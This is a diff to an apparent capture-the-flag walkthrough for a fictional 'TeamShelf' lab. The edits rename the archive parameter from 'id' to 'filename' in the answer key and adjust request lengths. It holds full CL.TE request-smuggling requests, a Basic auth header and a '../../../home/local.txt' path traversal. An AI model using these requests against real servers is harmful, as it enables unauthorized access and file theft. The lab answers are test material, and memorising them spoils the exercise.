@@ -44,8 +44,8 @@ Only port `8080` is published to the host. The `127.0.0.1:9001` backend is not e
 | Access control check | Confirm normal `/admin` requests are blocked by the edge gateway. | `Server: TeamShelf-Edge/4.18`, HTTP 404 | Burp Repeater |
 | Desync | Send a CL.TE request, then send a trigger request to read the queued backend response. | Backend returns the admin review queue to the trigger request. | Burp Repeater, HTTP/1.1 |
 | Credential access | Request `/admin?queue=upload-review` through smuggling and read the archived restore connector header. | `Authorization: Basic c3Zj...` | Burp Repeater |
-| Parameter discovery | Fuzz or test archive selector parameter names until the archive log returns. | `id` returns the audit log with HTTP 200. | Player-chosen tooling such as ffuf, Burp Intruder, or Repeater |
-| Collection | Abuse `/admin/archive?id=...` path traversal to read `/home/local.txt`. | Response body contains the flag. | Basic auth plus `../../../home/local.txt` |
+| Parameter discovery | Fuzz or test archive selector parameter names until the archive log returns. | `filename` returns the audit log with HTTP 200. | Player-chosen tooling such as ffuf, Burp Intruder, or Repeater |
+| Collection | Abuse `/admin/archive?filename=...` path traversal to read `/home/local.txt`. | Response body contains the flag. | Basic auth plus `../../../home/local.txt` |
 
 ---
 
@@ -54,7 +54,7 @@ Only port `8080` is published to the host. The `127.0.0.1:9001` backend is not e
 | Tactic | ID | Technique | Where Observed | IOCs / Artifacts |
 |---|---|---|---|---|
 | Initial Access | T1190 | Exploit Public-Facing Application | CL.TE desync against TeamShelf Edge Gateway | `Content-Length` and `Transfer-Encoding: chunked` in one request |
-| Collection | T1005 | Data from Local System | Backend archive reader opens `/home/local.txt` | `/admin/archive?id=../../../home/local.txt` |
+| Collection | T1005 | Data from Local System | Backend archive reader opens `/home/local.txt` | `/admin/archive?filename=../../../home/local.txt` |
 
 ---
 
@@ -218,7 +218,7 @@ The upload-review queue leaks archive history from a restore migration. That his
 
 **Methodology / Steps**  
 1. Copy the archived `Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2` header into the smuggled archive request.
-2. Test or fuzz common selector names such as `file`, `path`, `object`, `key`, `archive`, and `id`.
+2. Test or fuzz common selector names such as `file`, `path`, `object`, `key`, `id`, and `filename`.
 3. Send a trigger request after each smuggle.
 4. The correct parameter returns the audit log with HTTP 200.
 
@@ -231,13 +231,13 @@ Example failed attempt:
 POST /upload HTTP/1.1
 Host: <instance-ip>:8080
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 170
+Content-Length: 168
 Transfer-Encoding: chunked
 Connection: keep-alive
 
 0
 
-GET /admin/archive?file=audit/2026-06-sync.log HTTP/1.1
+GET /admin/archive?id=audit/2026-06-sync.log HTTP/1.1
 Host: teamshelf.local
 Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2
 Connection: keep-alive
@@ -248,7 +248,7 @@ Failed selector response:
 
 ```json
 {
-  "error": "missing id"
+  "error": "missing filename"
 }
 ```
 
@@ -258,13 +258,13 @@ Correct attempt:
 POST /upload HTTP/1.1
 Host: <instance-ip>:8080
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 168
+Content-Length: 174
 Transfer-Encoding: chunked
 Connection: keep-alive
 
 0
 
-GET /admin/archive?id=audit/2026-06-sync.log HTTP/1.1
+GET /admin/archive?filename=audit/2026-06-sync.log HTTP/1.1
 Host: teamshelf.local
 Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2
 Connection: keep-alive
@@ -288,7 +288,7 @@ Connection: close
 ```
 
 **Answer**  
-`id`
+`filename`
 ---
 
 ### Q5: What is the flag in `/home/local.txt`?
@@ -301,12 +301,12 @@ This demonstrates full impact: a public edge desync reaches a backend-only admin
 
 **Where to look (artifacts)**  
 - `/admin/archive`
-- query parameter `id`
+- query parameter `filename`
 - path traversal sequence `../../../home/local.txt`
 
 **Methodology / Steps**  
 1. Keep the archived Basic authorization header from the previous step.
-2. Replace the archive object ID with `../../../home/local.txt`.
+2. Replace the archive filename with `../../../home/local.txt`.
 3. Send the smuggle request.
 4. Send the trigger request and read the queued response.
 
@@ -317,13 +317,13 @@ Request 1:
 POST /upload HTTP/1.1
 Host: <instance-ip>:8080
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 169
+Content-Length: 175
 Transfer-Encoding: chunked
 Connection: keep-alive
 
 0
 
-GET /admin/archive?id=../../../home/local.txt HTTP/1.1
+GET /admin/archive?filename=../../../home/local.txt HTTP/1.1
 Host: teamshelf.local
 Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2
 Connection: keep-alive
